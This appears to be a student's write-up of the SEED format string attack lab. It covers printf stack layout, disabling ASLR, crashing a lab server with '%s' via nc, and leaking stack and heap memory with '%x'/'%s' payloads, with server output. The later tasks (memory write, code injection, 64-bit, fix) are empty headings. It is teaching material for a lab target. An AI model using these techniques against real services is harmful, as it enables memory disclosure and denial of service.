# Format String Attack Lab
- the `printf()` function in C is used to print out a string according to a format, its first argument is called *format* string, the format string uses placeholders marked by the `%` character, there are also other functions that use format string, `sprintf()`, `fprintf()`, `scanf()`
- some programs allow users to provide the entire or part of the contents in a format string, if such contents are not sanitized, attacker can use this opportunity to get the program to run arbitrary code, this problem is called **format string vulnerability**

- topics
    - format string vulnerability
    - code injection
    - stack layout
    - shellcode
    - reverse shell

- lab environment: `SEED Ubuntu 20.04 VM`

- the stack layout when call `printf("a=%d, b=%d", a, b)`
    ```
    High Memory Addresses
    |          +--------------------------+     
    |          |           ...            |
    |          +--------------------------+
    |          |            b             |
    |          |--------------------------| 
    |          |            a             |
    |          |--------------------------| 
    |          | address of format string |
    |          |--------------------------|
    |          |      return address      |
    |          |--------------------------|
    |          |     previous ebp/rbp     |
    |          |--------------------------|
    |          |           ...            |    
    |          +--------------------------+
    |          |       Unused Space       |
    |          +--------------------------+
    Low Memory Addresses
    ```
    - if we don't provide enough parameters, e.g., `printf("a=%d, b=%d", a)`, it will fetch the content from the position where `b` is supposed to be

## Setup
- turn off Address Space Layout Randomization:`sudo sysctl -w kernel.randomize_va_space=0` 
- compile server code (in the directory `Labsetup/server-code`)
    ```
    $ make
    [here will be a warning message]
    $ make install
    ```
- the warning message is generated by a countermeasure implemented in `gcc`, we can ignore it for now
- `-z execstack` option should be used in the compilation, for simplicity, non-executable stack countermeasure can be defeated using return-to-libc, there is a separate lab for return-to-libc

## Task 1: Crashing the Program
- target server `10.9.0.5`
- send a message to the server, we can see some information printed by the target container
    ```
    $ echo hello | nc 10.9.0.5 9090
    (Press Ctrl+C)
    ```
    ```
    server-10.9.0.5 | Got a connection from 10.9.0.1
    server-10.9.0.5 | Starting format
    server-10.9.0.5 | The input buffer's address:    0xffffd240
    server-10.9.0.5 | The secret message's address:  0x080b4008
    server-10.9.0.5 | The target variable's address: 0x080e5068
    server-10.9.0.5 | Waiting for user input ......
    server-10.9.0.5 | Received 6 bytes.
    server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd168
    server-10.9.0.5 | The target variable's value (before): 0x11223344
    server-10.9.0.5 | hello
    server-10.9.0.5 | The target variable's value (after):  0x11223344
    server-10.9.0.5 | (^_^)(^_^) Returned properly (^_^)(^_^)
    ```
- our goal for this task is to provide an input that makes the program crash (i.e., "Returned properly" is not printed out)
    - try `echo %s | nc 10.9.0.5 9090`
        ```
        ...
        server-10.9.0.5 | The target variable's value (before): 0x11223344
        (No more info printed out)
        ```
        - the program is crashed
## Task 2: Printing Out the Server Program's Memory
- target server `10.9.0.5`
- the objective of this task is to get the server to print out some data from its memory, the data will be printed out on the server side, so the attack cannot see it, but the technique used in this task will be essential for the subsequent tasks

### Task 2.A: Stack Data
- how many `%x` format specifiers do you need to get the program to print out the first four bytes of your input
    - we construct an input `"******** %s %s %s ... %s %x"`, to make it easier to find the first 4 bytes in the printout info of the server container, make the first 4 bytes `0x77777777`, construct the payload using a python program `task2A_payload.py`
    - the stack layout when calling `printf(msg)`
            ```
            High Memory Addresses
            |          +--------------------------+     
            |          |           ...            |
            |          +--------------------------+
            |          |        0x77777777        |
            |          |--------------------------| <---- address of input buffer 
            |          |           ...            |
            |          |--------------------------| 
            |          | address of input buffer  |
            |          |--------------------------| <---- first argument of printf()
            |          |      return address      |
            |          |--------------------------|
            |          |     previous ebp/rbp     |
            |          |--------------------------|
            |          |           ...            |    
            |          +--------------------------+
            |          |       Unused Space       |
            |          +--------------------------+
            Low Memory Addresses
            ```
    - when executing `printf()`, it will fetch a number of hexadecimal numbers from higher addresses, and if there is enough `%x` in the format string, it will finally fetch and print out the first 4 bytes in the input buffer, `0x77777777`
    - from the information printed out by the server, we can know the address of input buffer is `0xffffd240`, the frame pointer when in `myprintf()` is `0xffffd168`, so there will be **approximately** `216` bytes before reaching first 4 bytes of our input, each `%x` prints out 4 bytes, so the number of `%x` is around `54`, the precise number can be determined through experimentation, in my case, the number is `64`, and I can get the following output from the server (to make the output looks better, I acutally used `"%.8x"` in the payload)
        ```
        server-10.9.0.5 | wwww11223344 00001000 08049db5 080e5320 080e61c0 ffffd240 ffffd168 080e62d4 080e5000 ffffd208 08049f7e ffffd240 00000000 00000064 08049f47 080e5320 000005dc 000005dc ffffd240 ffffd240 080e9720 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 44371700 080e5000 080e5000 ffffd828 08049eff ffffd240 000005dc 000005dc 080e5320 00000000 00000000 00000000 ffffd8f4 00000000 00000000 00000000 000005dc 77777777 The target variable's value (after):  0x11223344
        server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
        ```

### Task 2.B: Heap Data
- there is a secret message (a string) stored in the heap area, and the server prints out its address, our objective is to print out this secrete message
    - te address of the secret message is `0x080b4008`, we need to place the address (in the binary form) of the secret message in the format string, if we still use `%x`, the container will only print out the address itself, not the content in that address, as the secret message is a string, use `%s`
    - in task `2.A`, we have already figured out the 64th placeholder specifier is for the first 4 bytes of our input, set this `%x` to `%s`
    - the output
        ```
        server-10.9.0.5 | wwww11223344 00001000 08049db5 080e5320 080e61c0 ffffd240 ffffd168 080e62d4 080e5000 ffffd208 08049f7e ffffd240 00000000 00000064 08049f47 080e5320 000005dc 000005dc ffffd240 ffffd240 080e9720 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 44371700 080e5000 080e5000 ffffd828 08049eff ffffd240 000005dc 000005dc 080e5320 00000000 00000000 00000000 ffffd8f4 00000000 00000000 00000000 000005dc A secret message
        server-10.9.0.5 | The target variable's value (after):  0x11223344
        server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
        ```

## Task 3: Modifying the Server Program's Memory

## Task 4: Inject Malicious Code into the Server Program

## Task 5: Attacking the 64-bit Server Program

## Task 6: Fixing the Problem